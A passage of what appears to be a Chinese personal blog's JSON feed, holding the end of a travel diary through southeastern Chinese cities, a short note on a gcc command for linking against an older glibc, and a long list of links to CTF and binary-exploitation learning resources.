color=\"red\">西湖太大了,我觉得一天其实是玩不完的,至少需要安排两天的.</font></p>\n<p>第三天:睡觉睡了一上午,因为第二天走得太累了</p>\n<p>机动: 武林门码头 水上巴士3元 京杭大运河晚7点和8点20发船,夜游 120&#x2F;人.  在拱墅区京杭大运河广场(走的动的话可以沿着河走…)</p>\n<p><img src=\"/2023%E5%B9%B4%E5%88%9D%E4%B8%9C%E5%8D%97%E6%B2%BF%E6%B5%B7%E6%97%85%E6%B8%B8%E6%B8%B8%E8%AE%B0/image-20230219194704257.png\" alt=\"image-20230219194704257\"></p>\n<h3 id=\"浙江省博物馆\"><a href=\"#浙江省博物馆\" class=\"headerlink\" title=\"浙江省博物馆\"></a>浙江省博物馆</h3><p>​\t\t浙江确实是富饶之地,馆藏丰富,还是值得一看的…没啥文化…说不出来别的…比较震撼的是看到了《新青年》,在历史书了解到这些的时候可能还没有那么震撼,当看到了真的书之后,仿佛回到了那一段历史.</p>\n<p><img src=\"/2023%E5%B9%B4%E5%88%9D%E4%B8%9C%E5%8D%97%E6%B2%BF%E6%B5%B7%E6%97%85%E6%B8%B8%E6%B8%B8%E8%AE%B0/2C95A28A-8953-4B3C-83B3-2609F8C1A502_1_102_o.jpeg\" alt=\"2C95A28A-8953-4B3C-83B3-2609F8C1A502_1_102_o\"></p>\n<p><img src=\"/2023%E5%B9%B4%E5%88%9D%E4%B8%9C%E5%8D%97%E6%B2%BF%E6%B5%B7%E6%97%85%E6%B8%B8%E6%B8%B8%E8%AE%B0/image-20230219200010752.png\" alt=\"image-20230219200010752\"></p>\n<h3 id=\"京杭大运河沿岸\"><a href=\"#京杭大运河沿岸\" class=\"headerlink\" title=\"京杭大运河沿岸\"></a>京杭大运河沿岸</h3><p><img src=\"/2023%E5%B9%B4%E5%88%9D%E4%B8%9C%E5%8D%97%E6%B2%BF%E6%B5%B7%E6%97%85%E6%B8%B8%E6%B8%B8%E8%AE%B0/image-20230219200204170.png\" alt=\"image-20230219200204170\"></p>\n<p><img src=\"/2023%E5%B9%B4%E5%88%9D%E4%B8%9C%E5%8D%97%E6%B2%BF%E6%B5%B7%E6%97%85%E6%B8%B8%E6%B8%B8%E8%AE%B0/image-20230219200230747.png\" alt=\"image-20230219200230747\"></p>\n<h3 id=\"西湖\"><a href=\"#西湖\" class=\"headerlink\" title=\"西湖\"></a>西湖</h3><p><img src=\"/2023%E5%B9%B4%E5%88%9D%E4%B8%9C%E5%8D%97%E6%B2%BF%E6%B5%B7%E6%97%85%E6%B8%B8%E6%B8%B8%E8%AE%B0/image-20230219200348141.png\" alt=\"image-20230219200348141\"></p>\n<p><img src=\"/2023%E5%B9%B4%E5%88%9D%E4%B8%9C%E5%8D%97%E6%B2%BF%E6%B5%B7%E6%97%85%E6%B8%B8%E6%B8%B8%E8%AE%B0/image-20230219200416205.png\" alt=\"image-20230219200416205\"> </p>\n<h3 id=\"灵隐寺\"><a href=\"#灵隐寺\" class=\"headerlink\" title=\"灵隐寺\"></a>灵隐寺</h3><p><img src=\"/2023%E5%B9%B4%E5%88%9D%E4%B8%9C%E5%8D%97%E6%B2%BF%E6%B5%B7%E6%97%85%E6%B8%B8%E6%B8%B8%E8%AE%B0/image-20230219200453107.png\" alt=\"image-20230219200453107\"></p>\n<h3 id=\"钱塘江\"><a href=\"#钱塘江\" class=\"headerlink\" title=\"钱塘江\"></a>钱塘江</h3><p><img src=\"/2023%E5%B9%B4%E5%88%9D%E4%B8%9C%E5%8D%97%E6%B2%BF%E6%B5%B7%E6%97%85%E6%B8%B8%E6%B8%B8%E8%AE%B0/image-20230219200619443.png\" alt=\"image-20230219200619443\"></p>\n<h3 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h3><ol>\n<li></li>\n</ol>\n<p>西溪国家湿地公园冬天去不是很好玩,因为都枯了……..不如夏天去.</p>\n<h2 id=\"2-2-福州\"><a href=\"#2-2-福州\" class=\"headerlink\" title=\"2.2  福州\"></a>2.2  福州</h2><p>路线: 杭州 — 福州 268</p>\n<p>行程: 下午5点到到,晚上玩一玩,2.3玩一天,2.4早上7.30去龙岩,</p>\n<p>住宿: xxx青年旅舍 靠近福州站 88两晚</p>\n<p>美食: 鱼丸、太极芋泥、咸时、肉燕、</p>\n<p>景点: 福建博物馆(三星堆!无需预约、60元)、三坊七巷、达明小吃街</p>\n<p>第一天:  随便逛逛</p>\n<p>第二天:  三坊七巷、福建博物馆</p>\n<p>来福州主要是感受福建的风土人情</p>\n<h3 id=\"三坊七巷\"><a href=\"#三坊七巷\" class=\"headerlink\" title=\"三坊七巷\"></a>三坊七巷</h3><p><img src=\"/2023%E5%B9%B4%E5%88%9D%E4%B8%9C%E5%8D%97%E6%B2%BF%E6%B5%B7%E6%97%85%E6%B8%B8%E6%B8%B8%E8%AE%B0/image-20230219200923697.png\" alt=\"image-20230219200923697\"><img src=\"/2023%E5%B9%B4%E5%88%9D%E4%B8%9C%E5%8D%97%E6%B2%BF%E6%B5%B7%E6%97%85%E6%B8%B8%E6%B8%B8%E8%AE%B0/image-20230219201005480.png\" alt=\"image-20230219201005480\"></p>\n<h3 id=\"林则徐纪念馆\"><a href=\"#林则徐纪念馆\" class=\"headerlink\" title=\"林则徐纪念馆\"></a>林则徐纪念馆</h3><p><img src=\"/2023%E5%B9%B4%E5%88%9D%E4%B8%9C%E5%8D%97%E6%B2%BF%E6%B5%B7%E6%97%85%E6%B8%B8%E6%B8%B8%E8%AE%B0/image-20230219201048699.png\" alt=\"image-20230219201048699\"></p>\n<h3 id=\"福建博物馆\"><a href=\"#福建博物馆\" class=\"headerlink\" title=\"福建博物馆\"></a>福建博物馆</h3><p><img src=\"/2023%E5%B9%B4%E5%88%9D%E4%B8%9C%E5%8D%97%E6%B2%BF%E6%B5%B7%E6%97%85%E6%B8%B8%E6%B8%B8%E8%AE%B0/image-20230219201114041.png\" alt=\"image-20230219201114041\">     </p>\n<h3 id=\"南澳海滩\"><a href=\"#南澳海滩\" class=\"headerlink\" title=\"南澳海滩\"></a>南澳海滩</h3><p><img src=\"/2023%E5%B9%B4%E5%88%9D%E4%B8%9C%E5%8D%97%E6%B2%BF%E6%B5%B7%E6%97%85%E6%B8%B8%E6%B8%B8%E8%AE%B0/image-20230219201150813.png\" alt=\"image-20230219201150813\"></p>\n<h3 id=\"达明小吃街\"><a href=\"#达明小吃街\" class=\"headerlink\" title=\"达明小吃街\"></a>达明小吃街</h3><h2 id=\"2-4-龙岩\"><a href=\"#2-4-龙岩\" class=\"headerlink\" title=\"2.4 龙岩\"></a>2.4 龙岩</h2><p>路线: 福州 — 龙岩 142</p>\n<p>行程: 10.56到龙岩,和董哥吃饭,下午晚上玩一玩、5号早上9点去厦门</p>\n<p>住宿: 董哥家里</p>\n<p>景点: 看永定土楼,客家文化</p>\n<p>第一天:  吃饭、土楼</p>\n<h3 id=\"永定土楼\"><a href=\"#永定土楼\" class=\"headerlink\" title=\"永定土楼\"></a>永定土楼</h3><p><img src=\"/2023%E5%B9%B4%E5%88%9D%E4%B8%9C%E5%8D%97%E6%B2%BF%E6%B5%B7%E6%97%85%E6%B8%B8%E6%B8%B8%E8%AE%B0/image-20230219202417695.png\" alt=\"image-20230219202417695\"><img src=\"/2023%E5%B9%B4%E5%88%9D%E4%B8%9C%E5%8D%97%E6%B2%BF%E6%B5%B7%E6%97%85%E6%B8%B8%E6%B8%B8%E8%AE%B0/image-20230219202443773.png\" alt=\"image-20230219202443773\"></p>\n<h3 id=\"古田会议会址\"><a href=\"#古田会议会址\" class=\"headerlink\" title=\"古田会议会址\"></a>古田会议会址</h3><p><img src=\"/2023%E5%B9%B4%E5%88%9D%E4%B8%9C%E5%8D%97%E6%B2%BF%E6%B5%B7%E6%97%85%E6%B8%B8%E6%B8%B8%E8%AE%B0/image-20230219202150812.png\" alt=\"image-20230219202150812\"></p>\n<p><img src=\"/2023%E5%B9%B4%E5%88%9D%E4%B8%9C%E5%8D%97%E6%B2%BF%E6%B5%B7%E6%97%85%E6%B8%B8%E6%B8%B8%E8%AE%B0/image-20230219202204052.png\" alt=\"image-20230219202204052\"></p>\n<h2 id=\"2-5-厦门\"><a href=\"#2-5-厦门\" class=\"headerlink\" title=\"2.5 厦门\"></a>2.5 厦门</h2><p>路线: 龙岩 — 厦门 23.5</p>\n<p>行程: 10.50到厦门,5号玩半天,6号玩一天,7号早上7.55出发到深圳</p>\n<p>住宿: 青年旅舍 厦门站边上 118两晚</p>\n<p>美食: 海鲜自助!!!!!! 沙茶面、鱼丸汤、蚵仔煎、姜母鸭、春卷</p>\n<p>景点: 鼓浪屿(35元、一定提前几天订船票、旺季提前半个月)、 南普陀寺(需要预约)、环岛路(骑行)、沙滩、 地铁1号线是海上地铁!</p>\n<p>去鼓浪屿: 厦门邮轮中心厦鼓码头(提前1小时到)(35元)  微信小程序:厦门轮渡+</p>\n<p>离岛: 三丘田码头 — 厦门轮渡码头</p>\n<p>第一天: 中山路步行街、南普陀寺、环岛路 这几个都在住宿附近,</p>\n<p>第二天:  2.6 早上登岛鼓浪屿,下午离岛</p>\n<p><img src=\"/2023%E5%B9%B4%E5%88%9D%E4%B8%9C%E5%8D%97%E6%B2%BF%E6%B5%B7%E6%97%85%E6%B8%B8%E6%B8%B8%E8%AE%B0/image-20230219194720380.png\" alt=\"image-20230219194720380\"></p>\n<h3 id=\"厦门地铁\"><a href=\"#厦门地铁\" class=\"headerlink\" title=\"厦门地铁\"></a>厦门地铁</h3><p><img src=\"/2023%E5%B9%B4%E5%88%9D%E4%B8%9C%E5%8D%97%E6%B2%BF%E6%B5%B7%E6%97%85%E6%B8%B8%E6%B8%B8%E8%AE%B0/image-20230219202538830.png\" alt=\"image-20230219202538830\"></p>\n<h3 id=\"厦门植物园\"><a href=\"#厦门植物园\" class=\"headerlink\" title=\"厦门植物园\"></a>厦门植物园</h3><h3 id=\"鼓浪屿\"><a href=\"#鼓浪屿\" class=\"headerlink\" title=\"鼓浪屿\"></a>鼓浪屿</h3><h3 id=\"南普陀寺\"><a href=\"#南普陀寺\" class=\"headerlink\" title=\"南普陀寺\"></a>南普陀寺</h3><h3 id=\"海鲜自助\"><a href=\"#海鲜自助\" class=\"headerlink\" title=\"海鲜自助\"></a>海鲜自助</h3><h2 id=\"2-7-深圳\"><a href=\"#2-7-深圳\" class=\"headerlink\" title=\"2.7 深圳\"></a>2.7 深圳</h2><p>路线: 厦门北 — 深圳北 125</p>\n<p>行程: 中午11点到,7号玩半天,8号下午2点出发去广州</p>\n<p>住宿: xx青年旅舍 42一晚,深圳北站附近</p>\n<p>景点: 深圳湾公园、深圳世界之窗(220元)、主要来这里感受大城市的繁华2333</p>\n<p>第一天: 深圳湾公园、世界之窗(待考虑</p>\n<p>第二天: 去找同学玩呀!!! 神仙院的</p>\n<p><img src=\"/2023%E5%B9%B4%E5%88%9D%E4%B8%9C%E5%8D%97%E6%B2%BF%E6%B5%B7%E6%97%85%E6%B8%B8%E6%B8%B8%E8%AE%B0/image-20230219194730434.png\" alt=\"image-20230219194730434\"></p>\n<h3 id=\"神仙院\"><a href=\"#神仙院\" class=\"headerlink\" title=\"神仙院\"></a>神仙院</h3><h2 id=\"2-8-广州\"><a href=\"#2-8-广州\" class=\"headerlink\" title=\"2.8 广州\"></a>2.8 广州</h2><p>路线 深圳 — 广州 21.5</p>\n<p>行程: 8号下午3.40到广州,玩半天,9号一天,10号中午启程回家、2.10号返程  回来机票 439</p>\n<p>住宿: xxx青年旅舍 120两晚,在市区(广州塔对面)</p>\n<p>美食: 早茶! 肠粉、煲仔饭、艇仔粥</p>\n<p>景点:  广东省博物馆(预约!)、广州塔、珠江夜游(水上巴士)、上下九步行街</p>\n<p>第一天: 下午到了,到处逛逛,然后夜游珠江,晚上看看广州塔(最美七公里 有轨电车!)</p>\n<p>第二天:广东省博物馆、</p>\n<p>第三天:  10点左右准备去机场了,  机票430</p>\n<p><img src=\"/2023%E5%B9%B4%E5%88%9D%E4%B8%9C%E5%8D%97%E6%B2%BF%E6%B5%B7%E6%97%85%E6%B8%B8%E6%B8%B8%E8%AE%B0/image-20230219194739402.png\" alt=\"image-20230219194739402\"></p>\n<h3 id=\"小蛮腰\"><a href=\"#小蛮腰\" class=\"headerlink\" title=\"小蛮腰\"></a>小蛮腰</h3><h3 id=\"广东博物馆\"><a href=\"#广东博物馆\" class=\"headerlink\" title=\"广东博物馆\"></a>广东博物馆</h3><h3 id=\"陈家祠\"><a href=\"#陈家祠\" class=\"headerlink\" title=\"陈家祠\"></a>陈家祠</h3><h3 id=\"南越王博物馆\"><a href=\"#南越王博物馆\" class=\"headerlink\" title=\"南越王博物馆\"></a>南越王博物馆</h3><h3 id=\"大佛寺\"><a href=\"#大佛寺\" class=\"headerlink\" title=\"大佛寺\"></a>大佛寺</h3><h3 id=\"好吃的\"><a href=\"#好吃的\" class=\"headerlink\" title=\"好吃的\"></a>好吃的</h3><h4 id=\"肠粉\"><a href=\"#肠粉\" class=\"headerlink\" title=\"肠粉\"></a>肠粉</h4><h4 id=\"早茶\"><a href=\"#早茶\" class=\"headerlink\" title=\"早茶\"></a>早茶</h4><h2 id=\"花销预算-实际花费\"><a href=\"#花销预算-实际花费\" class=\"headerlink\" title=\"花销预算 + 实际花费\"></a>花销预算 + 实际花费</h2><p>路费: 44 + 450.5 + 268 + 142 + 23.5 + 125 + 21.5 + 439 &#x3D; 1513.5</p>\n<p>住宿: 73 + 88 + 118 + 42 + 120 &#x3D; 441</p>\n<p>门票: 365</p>\n<p>其他: 船票 35</p>\n<p>饮食: 30 * 10 基础 + 300 特色食物</p>\n<p>吃饭记得减肥, 早餐晚餐少吃,可以吃一点当地特色食物</p>\n<p>总计: 1513.5 + 441 + 365 + 35 + 600 &#x3D; 2954.5元 -220（不去世界之窗了）-45（灵隐寺免费了）</p>\n<p><font color=\"red\">实际花费: 我懒得算了……..</font>总之….饮食方便预算太少了,虽然自己想减肥,但是每天体力消耗太大,每天平均18000步,不吃好扛不住…..最后花销应该在4500左右吧</p>\n<h1 id=\"经验教训\"><a href=\"#经验教训\" class=\"headerlink\" title=\"经验教训\"></a>经验教训</h1><p>0.<font color=\"red\">在家靠父母,出门靠朋友!</font> 多交一点(靠谱的)朋友还是很好的!!  去龙岩找的是本科同学,玩的还不错,非常客气,搞得我不太好意思😂. 在深圳是 社恐群里的 神仙院的校友hhhh,非常热情,带着吃饭和逛神仙院. 在广州的话,是年前在洛阳旅游碰到的三个信佛的姐姐,人非常好,给我准备了礼物还请我吃饭,大意了,我当时考虑过要不要准备礼物..后面忘了……</p>\n<p>1.旅游是很累的,要消耗体力的,是可以减肥的,但是效果不会有想象的那么好(毕竟也要好好吃饭,不然没力气玩了!!)</p>\n<p>2.吃当地特色有的美食街还是不错的,但最好的还是在居民聚居的地方!</p>\n",
            "tags": [
                "旅游"
            ]
        },
        {
            "id": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-%E9%81%87%E5%88%B0%E7%9A%84%E5%A5%87%E5%A5%87%E6%80%AA%E6%80%AA%E7%9A%84%E9%97%AE%E9%A2%98%E5%8F%8A%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/",
            "url": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-%E9%81%87%E5%88%B0%E7%9A%84%E5%A5%87%E5%A5%87%E6%80%AA%E6%80%AA%E7%9A%84%E9%97%AE%E9%A2%98%E5%8F%8A%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/",
            "title": "pwn入门-遇到的奇奇怪怪的问题及解决办法",
            "date_published": "2023-02-19T03:17:23.000Z",
            "content_html": "<p>gcc -Wl,-rpath&#x3D;&#x2F;home&#x2F;ubuntu&#x2F;glibc-all-in-one&#x2F;libs&#x2F;2.23-0ubuntu3_amd64&#x2F;&#x2F;,–dynamic-linker&#x3D;&#x2F;home&#x2F;ubuntu&#x2F;glibc-all-in-one&#x2F;libs&#x2F;2.23-0ubuntu3_amd64&#x2F;ld-linux-x86-64.so.2 1.c</p>\n<p>&#x3D;&gt; 0x563e8cd58c31 &lt;main+395&gt;:\tlea    rdi,[rip+0xbd5]        # 0x563e8cd5980d</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-%E9%81%87%E5%88%B0%E7%9A%84%E5%A5%87%E5%A5%87%E6%80%AA%E6%80%AA%E7%9A%84%E9%97%AE%E9%A2%98%E5%8F%8A%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/image-20230319232227418.png\" alt=\"image-20230319232227418\"></p>\n",
            "tags": []
        },
        {
            "id": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-0-%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%BA%90%E5%8F%8A%E5%A4%87%E5%BF%98%E4%BB%93%E5%BA%93/",
            "url": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-0-%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%BA%90%E5%8F%8A%E5%A4%87%E5%BF%98%E4%BB%93%E5%BA%93/",
            "title": "pwn入门-0-学习资源及备忘仓库",
            "date_published": "2023-02-18T11:36:51.000Z",
            "content_html": "<p>[toc]</p>\n<h1 id=\"每日可看\"><a href=\"#每日可看\" class=\"headerlink\" title=\"每日可看\"></a>每日可看</h1><p>玄武实验室  sec.today</p>\n<p>安全研究 GoSSIP 公众号每日推送</p>\n<p>吾爱破解 <a href=\"https://www.52pojie.cn/\">https://www.52pojie.cn</a></p>\n<p>看雪论坛 <a href=\"https://bbs.kanxue.com/\">https://bbs.kanxue.com</a></p>\n<p>v2ex 分享探索 社区 <a href=\"https://www.v2ex.com/\">https://www.v2ex.com</a></p>\n<h1 id=\"资源整合和学习路径\"><a href=\"#资源整合和学习路径\" class=\"headerlink\" title=\"资源整合和学习路径\"></a>资源整合和学习路径</h1><p><a href=\"https://csdiy.wiki/\">https://csdiy.wiki/</a> 北大学生总结的自学指南,非常好,融合了许多优质的公开课程和书籍</p>\n<h1 id=\"最近待看\"><a href=\"#最近待看\" class=\"headerlink\" title=\"最近待看\"></a>最近待看</h1><p><a href=\"https://github.com/firmianay/CTF-All-In-One/tree/master\">https://github.com/firmianay/CTF-All-In-One/tree/master</a> 感觉作者有添加一些新的东西(相比那本书)</p>\n<p><a href=\"https://seedsecuritylabs.org/instructor_manual.html\">https://seedsecuritylabs.org/instructor_manual.html</a> seedlab</p>\n<p><a href=\"https://nju-projectn.github.io/ics-pa-gitbook/ics2021/\">https://nju-projectn.github.io/ics-pa-gitbook/ics2021/</a> 南大计算机基础实验</p>\n<p><a href=\"http://www.hackdig.com/\">http://www.hackdig.com</a></p>\n<p><a href=\"https://www.bookstack.cn/read/webxiaohua-gitbook/README.md\">https://www.bookstack.cn/read/webxiaohua-gitbook/README.md</a></p>\n<p><a href=\"https://hacklido.com/\">https://hacklido.com/</a> 一个国外的网站, 有篇很励志的文章<a href=\"https://hacklido.com/blog/439-how-i-got-my-oscp-at-16-years-old\">https://hacklido.com/blog/439-how-i-got-my-oscp-at-16-years-old</a></p>\n<p><a href=\"https://hsqstephenzhang.github.io/2022/02/10/linux/syscall/vdso/\">https://hsqstephenzhang.github.io/2022/02/10/linux/syscall/vdso/</a>  腾讯云容器团队的一个老哥的博客,感觉挺有意思</p>\n<p>北理工那个团队网站 <a href=\"https://www.isclab.org.cn/\">https://www.isclab.org.cn</a></p>\n<p><a href=\"https://www.ooopn.com/\">https://www.ooopn.com</a> 一个工具网站</p>\n<p><a href=\"https://bbs.kanxue.com/thread-218617.htm\">https://bbs.kanxue.com/thread-218617.htm</a> 看雪 个人博客</p>\n<p><a href=\"https://hnusec.github.io/#/Stuff\">https://hnusec.github.io/#/Stuff</a></p>\n<p>国际知名战队的博客等</p>\n<p><a href=\"https://defcon.org/html/defcon-29/dc-29-speakers.html#fournier\">https://defcon.org/html/defcon-29/dc-29-speakers.html#fournier</a></p>\n<p><a href=\"https://blog.csdn.net/Breeze_CAT/article/details/103788631\">https://blog.csdn.net/Breeze_CAT/article/details/103788631</a></p>\n<p><a href=\"https://wizardforcel.gitbooks.io/100-gdb-tips/content/call-func.html\">https://wizardforcel.gitbooks.io/100-gdb-tips/content/call-func.html</a></p>\n<p><a href=\"https://www.52pojie.cn/thread-1399142-1-1.html\">https://www.52pojie.cn/thread-1399142-1-1.html</a></p>\n<p><a href=\"https://hack1s.fun/page/2/\">https://hack1s.fun/page/2/</a></p>\n<p><a href=\"http://javabin.cn/\">http://javabin.cn</a> 一个搞物联网的,感觉挺有意思</p>\n<h1 id=\"问题\"><a href=\"#问题\" class=\"headerlink\" title=\"问题\"></a>问题</h1><p>libc.so.6怎么用?</p>\n<p><a href=\"https://www.cnblogs.com/Taolaw/p/16281185.html\">https://www.cnblogs.com/Taolaw/p/16281185.html</a></p>\n<p>Glibc,libc gcc工作原理了解清楚</p>\n<h1 id=\"学习资源\"><a href=\"#学习资源\" class=\"headerlink\" title=\"学习资源\"></a>学习资源</h1><h2 id=\"安全会议\"><a href=\"#安全会议\" class=\"headerlink\" title=\"安全会议\"></a>安全会议</h2><p>四大顶会</p>\n<p>blackhat <a href=\"https://www.blackhat.com/\">https://www.blackhat.com</a></p>\n<p><a href=\"https://www.blackhat.com/latestintel/\">https://www.blackhat.com/latestintel/</a></p>\n<p><a href=\"https://www.blackhat.com/html/archives.html\">https://www.blackhat.com/html/archives.html</a></p>\n<h2 id=\"安全社区-可以没事多逛逛\"><a href=\"#安全社区-可以没事多逛逛\" class=\"headerlink\" title=\"安全社区(可以没事多逛逛)\"></a>安全社区(可以没事多逛逛)</h2><p>玄武实验室  sec.today</p>\n<p>吾爱破解 <a href=\"https://www.52pojie.cn/\">https://www.52pojie.cn</a></p>\n<p>看雪论坛 <a href=\"https://bbs.kanxue.com/\">https://bbs.kanxue.com</a></p>\n<p>v2ex 分享探索 社区 <a href=\"https://www.v2ex.com/\">https://www.v2ex.com</a></p>\n<p><a href=\"https://www.ctfiot.com/\">https://www.ctfiot.com</a>  chamd5的! 一个综合信息平台</p>\n<h2 id=\"学习网站\"><a href=\"#学习网站\" class=\"headerlink\" title=\"学习网站\"></a>学习网站</h2><p>CTFwiki（入门必看wiki）: <a href=\"https://ctf-wiki.github.io/ctf-wiki/#/introduction\">https://ctf-wiki.github.io/ctf-wiki/#/introduction</a></p>\n<p>ctftime     ctf各个比赛日程,很权威</p>\n<p>buuctf   <a href=\"https://buuoj.cn/\">https://buuoj.cn/</a></p>\n<p>ctfshow <a href=\"https://ctf.show/challenges\">https://ctf.show/challenges</a></p>\n<p>ctfhub</p>\n<p>CTFrank: <a href=\"https://ctfrank.org/\">https://ctfrank.org/</a></p>\n<p>攻防世界  xctf官方: <a href=\"https://time.xctf.org.cn/\">https://time.xctf.org.cn</a></p>\n<p>i春秋   <a href=\"https://www.ichunqiu.com/competition\">https://www.ichunqiu.com/competition</a></p>\n<p><a href=\"http://www.wechall.net/active_sites\">http://www.wechall.net/active_sites</a>  一个ctf网站，同时也收录了很多学习网站</p>\n<p>Tryhackme\\hackthebox\\</p>\n<h3 id=\"pwn专属\"><a href=\"#pwn专属\" class=\"headerlink\" title=\"pwn专属\"></a>pwn专属</h3><p>pwn.college   由浅入深,一步一步,还有机器可以用!</p>\n<p><a href=\"https://pwnable.kr/\">https://pwnable.kr</a>            </p>\n<p><a href=\"http://pwnable.tw/\">http://pwnable.tw</a>            </p>\n<h2 id=\"重要比赛\"><a href=\"#重要比赛\" class=\"headerlink\" title=\"重要比赛\"></a>重要比赛</h2><p>defcon <a href=\"https://defcon.org/html/defcon-30/dc-30-training.html\">https://defcon.org/html/defcon-30/dc-30-training.html</a></p>\n<h2 id=\"书籍\"><a href=\"#书籍\" class=\"headerlink\" title=\"书籍\"></a>书籍</h2><p>《计算机安全导论：深度实践 (杜文亮) 》 很适合入门,讲的非常详细</p>\n<p>《从0到1，CTFer的成长之路》</p>\n<p>《CTF权威指南-PWN篇》</p>\n<h2 id=\"大佬博客\"><a href=\"#大佬博客\" class=\"headerlink\" title=\"大佬博客\"></a>大佬博客</h2><p><a href=\"https://xuanxuanblingbling.github.io/\">https://xuanxuanblingbling.github.io</a>       xuanxuan和他对象的,记录了从小白到大神的一路,感觉写得非常好!</p>\n<p><a href=\"https://blingblingxuanxuan.github.io/\">https://blingblingxuanxuan.github.io</a></p>\n<p><a href=\"https://hurricane618.me/\">https://hurricane618.me</a> IIE学长的博客,有写自己的心路历程,感觉很不错,能从中看到一个人的成长 </p>\n<p><a href=\"https://kiprey.github.io/\">https://kiprey.github.io</a>       清华网安硕士在读,博客深入浅出,良好的学习路线</p>\n<p><a href=\"https://blog.csdn.net/weixin_45209963?type=blog\">https://blog.csdn.net/weixin_45209963?type=blog</a> 天大pwn老哥的博客</p>\n<p>计算机底层的秘密 <a href=\"https://github.com/webxiaohua/gitbook/blob/master/SUMMARY.md\">https://github.com/webxiaohua/gitbook/blob/master/SUMMARY.md</a> 这个合集不错</p>\n<p><a href=\"http://ifsec.blogspot.com/2018/02/so-you-want-to-work-in-security-and-for.html\">http://ifsec.blogspot.com/2018/02/so-you-want-to-work-in-security-and-for.html</a></p>\n<p><a href=\"https://bestwing.me/archives/page/14/\">https://bestwing.me/archives/page/14/</a></p>\n<p><a href=\"https://etenal.me/archives/1121\">https://etenal.me/archives/1121</a> 待看,这个也不错,这一篇是堆的</p>\n<p><a href=\"http://blog.imv1.me/\">http://blog.imv1.me</a>  NeSE搞内核安全的大佬学长</p>\n<p><a href=\"https://eqqie.cn/\">https://eqqie.cn</a></p>\n<p><a href=\"https://github.com/kiprey/skr_Learning\">https://github.com/kiprey/skr_Learning</a> 一个非常不错的成长路线(每周更新),可以参考,</p>\n<p><a href=\"https://cjting.me/\">https://cjting.me</a>  做的一些很深入的小研究,治愈系</p>\n<p><a href=\"https://trailofbits.github.io/ctf/\">https://trailofbits.github.io/ctf/</a></p>\n<p><a href=\"https://link.zhihu.com/?target=https://security.ntu.st/\">https://security.ntu.st/</a></p>\n<p><a href=\"https://github.com/BrieflyX/ctf-pwns\">https://github.com/BrieflyX/ctf-pwns</a> </p>\n<p>Atum</p>\n<p><a href=\"https://hpdoger.cn/about/\">https://hpdoger.cn/about/</a> 又一个学长的博客</p>\n<p><a href=\"https://trailofbits.github.io/ctf/\">https://trailofbits.github.io/ctf/</a></p>\n<p><a href=\"https://link.zhihu.com/?target=https://security.ntu.st/\">https://security.ntu.st/</a></p>\n<p><a href=\"https://etenal.me/archives/972#C1\">https://etenal.me/archives/972#C1</a></p>\n<p><a href=\"https://github.com/BrieflyX/ctf-pwns\">https://github.com/BrieflyX/ctf-pwns</a></p>\n<p><a href=\"https://y4er.com/\">https://y4er.com</a> web</p>\n<ul>\n<li><a href=\"https://blog.flanker017.me/\">https://blog.flanker017.me</a></li>\n<li>Eastmount（csdn）、娜璋ai安全之家（公众号）：博士在读，研究AI、网络安全   <a href=\"https://blog.csdn.net/Eastmount\">https://blog.csdn.net/Eastmount</a></li>\n<li><a href=\"http://shell-storm.org/\">http://shell-storm.org</a> 国外大佬，还有很多shellcode样本[<a href=\"http://shell-storm.org/shellcode/]\">http://shell-storm.org/shellcode/]</a>(</li>\n</ul>\n<p><a href=\"http://scz.617.cn:8/\">http://scz.617.cn:8</a>   不知道是哪个大佬.. </p>\n<p><a href=\"http://showlinkroom.me/\">http://showlinkroom.me</a></p>\n<p><a href=\"https://eternalsakura13.com/\">https://eternalsakura13.com/</a></p>\n<p><a href=\"https://kiprey.github.io/\">https://kiprey.github.io/</a></p>\n<p><a href=\"http://blog.eonew.cn/\">http://blog.eonew.cn/</a></p>\n<p><a href=\"http://ruanyifeng.com/blog/2018/02/docker-tutorial.html\">http://ruanyifeng.com/blog/2018/02/docker-tutorial.html</a></p>\n<p><a href=\"https://thiscute.world/\">https://thiscute.world/</a> 最近发现的两个计算机的大佬,在v2ex中发现的</p>\n<p><a href=\"https://soulteary.com/\">https://soulteary.com</a> </p>\n<p>0xffff社区</p>\n<p><a href=\"https://0xffff.one/d/1085-mit6-s081-operating-system\">https://0xffff.one/d/1085-mit6-s081-operating-system</a></p>\n<h2 id=\"CTF知名战队网站\"><a href=\"#CTF知名战队网站\" class=\"headerlink\" title=\"CTF知名战队网站\"></a>CTF知名战队网站</h2><p>国科大-NeSE:<a href=\"https://nese.team/\">https://nese.team</a></p>\n<p>清华:<a href=\"https://redbud.info/\">https://redbud.info</a></p>\n<p>复旦白泽战队:知乎、微信公众号</p>\n<p>X1cT34m: <a href=\"https://ctf.njupt.edu.cn/\">https://ctf.njupt.edu.cn</a>   </p>\n<p>SU:<a href=\"https://team-su.github.io/\">https://team-su.github.io</a></p>\n<p>星盟:<a href=\"https://space.bilibili.com/489643272\">https://space.bilibili.com/489643272</a> 有ctf培训课程 pwn已完结 、 微信公众号:星盟安全</p>\n<p>天璇Merak: 微信公众号,有一些文章,更新较少</p>\n<p>星盟  <a href=\"http://blog.xmcve.com/\">http://blog.xmcve.com</a></p>\n<h2 id=\"漏洞挖掘-x2F-分析工具\"><a href=\"#漏洞挖掘-x2F-分析工具\" class=\"headerlink\" title=\"漏洞挖掘&#x2F;分析工具\"></a>漏洞挖掘&#x2F;分析工具</h2><p>angr</p>\n<h2 id=\"一些小工具\"><a href=\"#一些小工具\" class=\"headerlink\" title=\"一些小工具:\"></a>一些小工具:</h2><p>Compiler Explorer   在线应用层代码转汇编</p>\n<p>在线运行汇编 <a href=\"https://www.tutorialspoint.com/compile_assembly_online.php\">https://www.tutorialspoint.com/compile_assembly_online.php</a></p>\n<p><a href=\"https://www.textcompare.org/\">https://www.textcompare.org</a> diff网站,比较各种内容的不同</p>\n<p><a href=\"https://gchq.github.io/CyberChef/\">https://gchq.github.io/CyberChef/</a> 